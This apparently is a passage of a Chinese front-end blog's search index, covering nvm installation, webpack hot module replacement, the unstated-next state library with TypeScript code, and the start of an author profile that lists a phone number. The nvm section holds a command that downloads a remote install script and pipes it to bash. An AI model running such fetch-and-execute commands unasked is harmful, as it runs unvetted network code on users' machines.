--clean\"</span><br></pre></td></tr></tbody></table></figure>","categories":["前端","npm"],"tags":["前端","npm","nrm"]},{"title":"nvm 管理 node 版本","url":"//web/npm/nvm.html","content":"<h4 id=\"Windows-上安装\"><a href=\"#Windows-上安装\" class=\"headerlink\" title=\"Windows 上安装\"></a>Windows 上安装</h4><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL252bS1zaC9udm0=\">nvm_github<i class=\"fa fa-external-link-alt\"></i></span></p>\n<ol>\n<li>点击 “Code” 按钮，然后选择 “Download ZIP” 下载 ZIP 文件。</li>\n<li>解压缩 ZIP 文件：解压缩下载的 ZIP 文件，将解压后的文件夹放在您想要安装 NVM 的位置。</li>\n<li>配置环境变量：打开命令提示符或 PowerShell，并运行以下命令来配置 NVM 的环境变量：</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">setx NVM_HOME \"解压缩文件夹的完整路径\"</span><br><span class=\"line\">setx NVM_SYMLINK \"解压缩文件夹的完整路径\"</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"Linux-上安装\"><a href=\"#Linux-上安装\" class=\"headerlink\" title=\"Linux 上安装\"></a>Linux 上安装</h4><ol>\n<li>下载 NVM 安装脚本：打开终端并运行以下命令下载 NVM 安装脚本：</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这将从 NVM GitHub 存储库下载并运行安装脚本。</p>\n<ol start=\"2\">\n<li>配置 NVM 环境变量：安装脚本运行后，会将 NVM 相关的路径和初始化脚本添加到您的个人配置文件（如 <del>/.bashrc、</del>/.zshrc 等）。要使这些更改生效，可以运行以下命令：</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">source ~/.bashrc</span><br></pre></td></tr></tbody></table></figure>\n\n<p>如果您使用的是其他 Shell，替换～/.bashrc 为您实际使用的配置文件。</p>\n<h4 id=\"验证安装\"><a href=\"#验证安装\" class=\"headerlink\" title=\"验证安装\"></a>验证安装</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">nvm --version</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"安装node-js-版本\"><a href=\"#安装node-js-版本\" class=\"headerlink\" title=\"安装node.js 版本\"></a>安装 node.js 版本</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">nvm install &lt;version&gt;</span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>例如</strong></p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">nvm install 16.13.0</span><br></pre></td></tr></tbody></table></figure>\n\n<p>安装成功后，NVM 会自动将该版本设置为默认版本。</p>\n<h4 id=\"切换版本\"><a href=\"#切换版本\" class=\"headerlink\" title=\"切换版本\"></a>切换版本</h4><p>切换 Node.js 版本：如果您有多个安装的 Node.js 版本，可以使用以下命令切换不同的版本：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">nvm use &lt;version&gt;</span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>例如</strong></p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">nvm use 18.16.0</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这将将您的当前 Shell 会话设置为使用指定的 Node.js 版本。</p>\n<h4 id=\"查询当前版本\"><a href=\"#查询当前版本\" class=\"headerlink\" title=\"查询当前版本\"></a>查询当前版本</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">nvm use node</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"查询当前node路径\"><a href=\"#查询当前node路径\" class=\"headerlink\" title=\"查询当前node路径\"></a>查询当前 node 路径</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">nvm which 18.16.0</span><br><span class=\"line\">/Users/shaosong/.nvm/versions/node/v18.16.0/bin/node</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"listing-Version\"><a href=\"#listing-Version\" class=\"headerlink\" title=\"listing Version\"></a>listing Version</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">nvm ls</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"设置默认version\"><a href=\"#设置默认version\" class=\"headerlink\" title=\"设置默认version\"></a>设置默认 version</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">nvm alias default 18.16.0</span><br></pre></td></tr></tbody></table></figure>\n\n<p>现在，您已经在 Linux 上成功安装了 NVM。您可以使用 nvm use 命令切换不同的 Node.js 版本，并使用 node 和 npm 命令来管理您的 Node.js 环境。</p>\n","categories":["前端","npm"],"tags":["前端","npm","nvm"]},{"title":"webpack 热更新的实现原理","url":"//web/webpack/hot/module/replacement.html","content":"<p>webpack 的热更新⼜称热替换（Hot Module Replacement），缩写为 HMR。这个机制可以做到不⽤刷新浏览器⽽将新变更的模块替换掉旧的模块。<br>原理：<br><img data-src=\"https://pic.imgdb.cn/item/65366aa5c458853aefbf449c.png\" alt=\"在这里插入图片描述\"></p>\n<p>⾸先要知道 server 端和 client 端都做了处理⼯作：</p>\n<ol>\n<li>在 webpack 的 watch 模式下，⽂件系统中某⼀个⽂件发⽣修改，webpack 监听到⽂件变化，根据配置⽂件对模块重新编译打包，并将打包后的代码通过简单的 JavaScript 对象保存在内存中。</li>\n<li>webpack-dev-server 和 webpack 之间的接⼝交互，⽽在这⼀步，主要是 dev-server 的中间件 webpack- dev-middleware 和 webpack 之间的交互，webpack-dev-middleware 调⽤ webpack 暴露的 API 对代码变化进⾏监 控，并且告诉 webpack，将代码打包到内存中。</li>\n<li>webpack-dev-server 对⽂件变化的⼀个监控，这⼀步不同于第⼀步，并不是监控代码变化重新打包。当我们在配置⽂件中配置了 devServer.watchContentBase 为 true 的时候，Server 会监听这些配置⽂件夹中静态⽂件的变化，变化后会通知浏览器端对应⽤进⾏ live reload。注意，这⼉是浏览器刷新，和 HMR 是两个概念。</li>\n<li>webpack-dev-server 代码的⼯作，该步骤主要是通过 sockjs（webpack-dev-server 的依赖）在浏览器端和服务端之间建⽴⼀个 websocket ⻓连接，将 webpack 编译打包的各个阶段的状态信息告知浏览器端，同时也包括第三步中 Server 监听静态⽂件变化的信息。浏览器端根据这些 socket 消息进⾏不同的操作。当然服务端传递的最主要信息还是新模块的 hash 值，后⾯的步骤根据这⼀ hash 值来进⾏模块热替换。</li>\n<li>webpack-dev-server/client 端并不能够请求更新的代码，也不会执⾏ 热 更 模 块 操 作 ， ⽽ 把 这 些 ⼯ 作⼜交回给了 webpack，webpack/hot/dev-server 的 ⼯ 作就是根据 webpack-dev-server/client 传给它的信息以及 dev-server 的配置决定是刷新浏览器呢还是进⾏模块热更新。当然如果仅仅是刷新浏览器，也就没有后⾯那些步骤了。</li>\n<li>HotModuleReplacement.runtime 是客户端 HMR 的中枢，它接收到上⼀ 步 传 递 给 他 的 新 模 块 的 hash 值，它通过 JsonpMainTemplate.runtime 向 server 端发送 Ajax 请求，服务端返回⼀个 json，该 json 包含了所有要更新的模块的 hash 值，获取到更新列表后，该模块再次通过 jsonp 请求，获取到最新的模块代码。这就是上图中 7、8、9 步骤。</li>\n<li>⽽第 10 步是决定 HMR 成功与否的关键步骤，在该步骤中，HotModulePlugin 将会对新旧模块进⾏对⽐，决定是否更新模块，在决定更新模块后，检查模块之间的依赖关系，更新模块的同时更新模块间的依赖引⽤。</li>\n</ol>\n<p>最后⼀步，当 HMR 失败后，回退到 live reload 操作，也就是进⾏浏览器刷新来获取最新打包代码。</p>\n","categories":["前端","WebPack"],"tags":["前端","浏览器","WebPack"]},{"title":"unstate-next 的实现原理","url":"//react/components/unstate-next-implement.html","content":"<h4 id=\"定义实现Container接口\"><a href=\"#定义实现Container接口\" class=\"headerlink\" title=\"定义实现Container接口\"></a>定义实现 Container 接口</h4><p>需要实现包装方法和获取数据的 hooks</p>\n<figure class=\"highlight tsx\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 实现接口</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">Container</span>&lt;<span class=\"title class_\">Value</span>, <span class=\"title class_\">State</span>&gt; {</span><br><span class=\"line\"><span class=\"title class_\">Provider</span>: <span class=\"title class_\">React</span>.<span class=\"property\">ComponentType</span>&lt;<span class=\"title class_\">ContainerProviderProps</span>&lt;<span class=\"title class_\">State</span>&gt;&gt;;</span><br><span class=\"line\"><span class=\"attr\">useContainer</span>: <span class=\"function\">() =&gt;</span> <span class=\"title class_\">Value</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"定义实现Provider接口\"><a href=\"#定义实现Provider接口\" class=\"headerlink\" title=\"定义实现Provider接口\"></a>定义实现 Provider 接口</h4><p>定义接口需要初始化参数和需要使用的子节点。</p>\n<figure class=\"highlight tsx\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * ContainerProviderProps 定义类型</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">State</span>} <span class=\"variable\">State</span></span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> {<span class=\"type\">State</span>} <span class=\"variable\">initialState</span></span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> {<span class=\"type\">React.ReactNode</span>} <span class=\"variable\">children</span></span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">ContainerProviderProps</span>&lt;<span class=\"title class_\">State</span> = <span class=\"built_in\">any</span>&gt; {</span><br><span class=\"line\">initialState?: <span class=\"title class_\">State</span>;</span><br><span class=\"line\"><span class=\"attr\">children</span>: <span class=\"title class_\">React</span>.<span class=\"property\">ReactNode</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"createContainer-方法\"><a href=\"#createContainer-方法\" class=\"headerlink\" title=\"createContainer 方法\"></a>createContainer 方法</h4><p>在 <code>createContainer</code> 方法中，使用后会返回两个方法 <code>Provider</code> 和 <code>useContainer</code>。</p>\n<p>步骤：</p>\n<ol>\n<li>使用 React.createContext 创建 Context；</li>\n<li>自定义 hooks 获取属性；</li>\n<li>需要使用 Context 子组件使用 Provider 包装， 将数据写入 Context；</li>\n<li>使用 React.useContext 从 Context 中获取属性 </li>\n</ol>\n<figure class=\"highlight tsx\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> createContainer&lt;<span class=\"title class_\">Value</span>, <span class=\"title class_\">State</span> = <span class=\"built_in\">void</span>&gt;(</span><br><span class=\"line\"><span class=\"attr\">useHook</span>: <span class=\"function\">(<span class=\"params\">initialState?: State</span>) =&gt;</span> <span class=\"title class_\">Value</span></span><br><span class=\"line\">): <span class=\"title class_\">Container</span>&lt;<span class=\"title class_\">Value</span>, <span class=\"title class_\">State</span>&gt; {</span><br><span class=\"line\"><span class=\"comment\">// 使用React.createContext 创建Context</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title class_\">Context</span> = <span class=\"title class_\">React</span>.<span class=\"property\">createContext</span>&lt;<span class=\"title class_\">Value</span> | <span class=\"keyword\">typeof</span> <span class=\"variable constant_\">EMPTY</span>&gt;(<span class=\"variable constant_\">EMPTY</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Provider</span>(<span class=\"params\">props: ContainerProviderProps&lt;State&gt;</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 自定义hooks 获取属性</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> value = <span class=\"title function_\">useHook</span>(props.<span class=\"property\">initialState</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 需要使用Context 子组件使用Provider 包装， 将数据写入Context。</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">Context.Provider</span> <span class=\"attr\">value</span>=<span class=\"string\">{value}</span>&gt;</span>{props?.children}<span class=\"tag\">&lt;/<span class=\"name\">Context.Provider</span>&gt;</span></span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">useContainer</span>(<span class=\"params\"></span>): <span class=\"title class_\">Value</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 使用React.useContext 从 Context 中获取属性</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> value = <span class=\"title class_\">React</span>.<span class=\"title function_\">useContext</span>(<span class=\"title class_\">Context</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (value === <span class=\"variable constant_\">EMPTY</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Error</span>(<span class=\"string\">\"Component must be wrapped with &lt;Container.Provider&gt;\"</span>);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">return</span> value;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">return</span> {</span><br><span class=\"line\">    <span class=\"title class_\">Provider</span>,</span><br><span class=\"line\">    useContainer,</span><br><span class=\"line\">};</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"useContainer\"><a href=\"#useContainer\" class=\"headerlink\" title=\"useContainer\"></a>useContainer</h4><p>使用 useContainer 从 Container 中直接获取属性。</p>\n<figure class=\"highlight tsx\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> useContainer&lt;<span class=\"title class_\">Value</span>, <span class=\"title class_\">State</span> = <span class=\"built_in\">void</span>&gt;(</span><br><span class=\"line\"><span class=\"attr\">container</span>: <span class=\"title class_\">Container</span>&lt;<span class=\"title class_\">Value</span>, <span class=\"title class_\">State</span>&gt;</span><br><span class=\"line\">): <span class=\"title class_\">Value</span> {</span><br><span class=\"line\"><span class=\"keyword\">return</span> container.<span class=\"title function_\">useContainer</span>();</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"unstate-next-使用\"><a href=\"#unstate-next-使用\" class=\"headerlink\" title=\"unstate-next 使用\"></a><a href=\"./unstate-next-use.html\">unstate-next 使用</a></h4><h4 id=\"实现code\"><a href=\"#实现code\" class=\"headerlink\" title=\"实现code\"></a>实现 code</h4><figure class=\"highlight tsx\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"title class_\">React</span> <span class=\"keyword\">from</span> <span class=\"string\">\"react\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"attr\">EMPTY</span>: unique <span class=\"built_in\">symbol</span> = <span class=\"title class_\">Symbol</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * ContainerProviderProps 定义类型</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">State</span>} <span class=\"variable\">State</span></span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> {<span class=\"type\">State</span>} <span class=\"variable\">initialState</span></span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> {<span class=\"type\">React.ReactNode</span>} <span class=\"variable\">children</span></span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">ContainerProviderProps</span>&lt;<span class=\"title class_\">State</span> = <span class=\"built_in\">any</span>&gt; {</span><br><span class=\"line\">initialState?: <span class=\"title class_\">State</span>;</span><br><span class=\"line\"><span class=\"attr\">children</span>: <span class=\"title class_\">React</span>.<span class=\"property\">ReactNode</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 实现接口</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">Container</span>&lt;<span class=\"title class_\">Value</span>, <span class=\"title class_\">State</span>&gt; {</span><br><span class=\"line\"><span class=\"title class_\">Provider</span>: <span class=\"title class_\">React</span>.<span class=\"property\">ComponentType</span>&lt;<span class=\"title class_\">ContainerProviderProps</span>&lt;<span class=\"title class_\">State</span>&gt;&gt;;</span><br><span class=\"line\"><span class=\"attr\">useContainer</span>: <span class=\"function\">() =&gt;</span> <span class=\"title class_\">Value</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> createContainer&lt;<span class=\"title class_\">Value</span>, <span class=\"title class_\">State</span> = <span class=\"built_in\">void</span>&gt;(</span><br><span class=\"line\"><span class=\"attr\">useHook</span>: <span class=\"function\">(<span class=\"params\">initialState?: State</span>) =&gt;</span> <span class=\"title class_\">Value</span></span><br><span class=\"line\">): <span class=\"title class_\">Container</span>&lt;<span class=\"title class_\">Value</span>, <span class=\"title class_\">State</span>&gt; {</span><br><span class=\"line\"><span class=\"comment\">// 使用React.createContext 创建Context</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title class_\">Context</span> = <span class=\"title class_\">React</span>.<span class=\"property\">createContext</span>&lt;<span class=\"title class_\">Value</span> | <span class=\"keyword\">typeof</span> <span class=\"variable constant_\">EMPTY</span>&gt;(<span class=\"variable constant_\">EMPTY</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Provider</span>(<span class=\"params\">props: ContainerProviderProps&lt;State&gt;</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 自定义hooks 获取属性</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> value = <span class=\"title function_\">useHook</span>(props.<span class=\"property\">initialState</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 需要使用Context 子组件使用Provider 包装， 将数据写入Context。</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">Context.Provider</span> <span class=\"attr\">value</span>=<span class=\"string\">{value}</span>&gt;</span>{props?.children}<span class=\"tag\">&lt;/<span class=\"name\">Context.Provider</span>&gt;</span></span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">useContainer</span>(<span class=\"params\"></span>): <span class=\"title class_\">Value</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 使用React.useContext 从 Context 中获取属性</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> value = <span class=\"title class_\">React</span>.<span class=\"title function_\">useContext</span>(<span class=\"title class_\">Context</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (value === <span class=\"variable constant_\">EMPTY</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Error</span>(<span class=\"string\">\"Component must be wrapped with &lt;Container.Provider&gt;\"</span>);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">return</span> value;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">return</span> {</span><br><span class=\"line\">    <span class=\"title class_\">Provider</span>,</span><br><span class=\"line\">    useContainer,</span><br><span class=\"line\">};</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> useContainer&lt;<span class=\"title class_\">Value</span>, <span class=\"title class_\">State</span> = <span class=\"built_in\">void</span>&gt;(</span><br><span class=\"line\"><span class=\"attr\">container</span>: <span class=\"title class_\">Container</span>&lt;<span class=\"title class_\">Value</span>, <span class=\"title class_\">State</span>&gt;</span><br><span class=\"line\">): <span class=\"title class_\">Value</span> {</span><br><span class=\"line\"><span class=\"keyword\">return</span> container.<span class=\"title function_\">useContainer</span>();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n","categories":["React","components","unstate-next"],"tags":["前端","TypeScript","react","unstate-next"]},{"title":"unstate-next 的使用","url":"//react/components/unstate-next-use.html","content":"<h4 id=\"Install\"><a href=\"#Install\" class=\"headerlink\" title=\"Install\"></a>Install</h4><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRjb2RlLm5ldC9xcV8zNTQ5MDE5MS9SZWFjdC1UeXBlU2NyaXB0\">Code-Test<i class=\"fa fa-external-link-alt\"></i></span></p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">npm install --save unstated-next</span><br><span class=\"line\"></span><br><span class=\"line\">yarn add unstated-next</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"createContainer\"><a href=\"#createContainer\" class=\"headerlink\" title=\"createContainer\"></a>createContainer</h4><figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { useState } <span class=\"keyword\">from</span> <span class=\"string\">\"react\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> { createContainer } <span class=\"keyword\">from</span> <span class=\"string\">\"unstated-next\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">useCounter</span> = (<span class=\"params\">props: <span class=\"built_in\">any</span></span>) =&gt; {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> { initNum } = props;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> [num, changeNum] = useState&lt;<span class=\"built_in\">number</span>&gt;(initNum);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"title function_\">decrement</span> = (<span class=\"params\"></span>) =&gt; <span class=\"title function_\">changeNum</span>(num - <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"title function_\">increment</span> = (<span class=\"params\"></span>) =&gt; <span class=\"title function_\">changeNum</span>(num + <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> {num, decrement, increment};</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> <span class=\"title class_\">Counter</span> = <span class=\"title function_\">createContainer</span>(useCounter);</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"use-Provider-initialState\"><a href=\"#use-Provider-initialState\" class=\"headerlink\" title=\"use Provider &amp;&amp; initialState\"></a>use Provider &amp;&amp; initialState</h4><figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">'./App.css'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> { <span class=\"title class_\">Counter</span> } <span class=\"keyword\">from</span> <span class=\"string\">'./Context'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> {<span class=\"title class_\">TestCounter</span>} <span class=\"keyword\">from</span> <span class=\"string\">'./TestCounter'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"keyword\">function</span> <span class=\"title function_\">App</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\"><span class=\"keyword\">return</span> (</span><br><span class=\"line\">    <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">Counter.Provider</span> <span class=\"attr\">initialState</span>=<span class=\"string\">{{</span> <span class=\"attr\">initNum:</span> <span class=\"attr\">1</span> }}&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;<span class=\"name\">TestCounter</span> /&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;/<span class=\"name\">Counter.Provider</span>&gt;</span></span></span><br><span class=\"line\">)</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"useContainer\"><a href=\"#useContainer\" class=\"headerlink\" title=\"useContainer\"></a>useContainer</h4><h5 id=\"TestCounter\"><a href=\"#TestCounter\" class=\"headerlink\" title=\"TestCounter\"></a>TestCounter</h5><figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { <span class=\"title class_\">Counter</span> } <span class=\"keyword\">from</span> <span class=\"string\">\"./Context\"</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> {<span class=\"title class_\">TestChild</span>} <span class=\"keyword\">from</span> <span class=\"string\">'./TestChild'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> <span class=\"title function_\">TestCounter</span> = (<span class=\"params\"></span>) =&gt; {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> { num, decrement } = <span class=\"title class_\">Counter</span>.<span class=\"title function_\">useContainer</span>();</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"language-xml\"><span class=\"tag\">&lt;&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">        <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">{decrement}</span>&gt;</span>减法<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">        <span class=\"tag\">&lt;<span class=\"name\">TestChild</span> /&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;/&gt;</span></span></span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<h5 id=\"TestChild\"><a href=\"#TestChild\" class=\"headerlink\" title=\"TestChild\"></a>TestChild</h5><figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { <span class=\"title class_\">Counter</span> } <span class=\"keyword\">from</span> <span class=\"string\">\"./Context\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> <span class=\"title function_\">TestChild</span> = (<span class=\"params\"></span>) =&gt; {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> { num, increment } = <span class=\"title class_\">Counter</span>.<span class=\"title function_\">useContainer</span>();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"language-xml\"><span class=\"tag\">&lt;&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">        {num} <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">{increment}</span>&gt;</span>加法<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;/&gt;</span></span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n","categories":["React","components","unstate-next"],"tags":["前端","TypeScript","react","unstate-next"]},{"title":"404","url":"//404.html","content":"<figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">██╗  ██╗ ██████╗ ██╗  ██╗    ███╗   ██╗ ██████╗ ████████╗</span><br><span class=\"line\">██║  ██║██╔═████╗██║  ██║    ████╗  ██║██╔═══██╗╚══██╔══╝</span><br><span class=\"line\">███████║██║██╔██║███████║    ██╔██╗ ██║██║   ██║   ██║</span><br><span class=\"line\">╚════██║████╔╝██║╚════██║    ██║╚██╗██║██║   ██║   ██║</span><br><span class=\"line\">     ██║╚██████╔╝     ██║    ██║ ╚████║╚██████╔╝   ██║</span><br><span class=\"line\">     ╚═╝ ╚═════╝      ╚═╝    ╚═╝  ╚═══╝ ╚═════╝    ╚═╝</span><br><span class=\"line\"></span><br><span class=\"line\">    ███████╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗</span><br><span class=\"line\">    ██╔════╝██╔═══██╗██║   ██║████╗  ██║██╔══██╗</span><br><span class=\"line\">    █████╗  ██║   ██║██║   ██║██╔██╗ ██║██║  ██║</span><br><span class=\"line\">    ██╔══╝  ██║   ██║██║   ██║██║╚██╗██║██║  ██║</span><br><span class=\"line\">    ██║     ╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝</span><br><span class=\"line\">    ╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝</span><br></pre></td></tr></tbody></table></figure>\n"},{"title":"archives","url":"/archives/index.html","content":""},{"title":"有关于我","url":"//about/me.html","content":"<hr>\n<h4 id=\"个人信息\"><a href=\"#个人信息\" class=\"headerlink\" title=\"个人信息\"></a>个人信息</h4><ul>\n<li>性 别：男 \t\t\t\t\t\t\t\t\t\t\t  年 龄：27</li>\n<li> 手 机：15594555052                           邮 箱：<span class=\"exturl\" 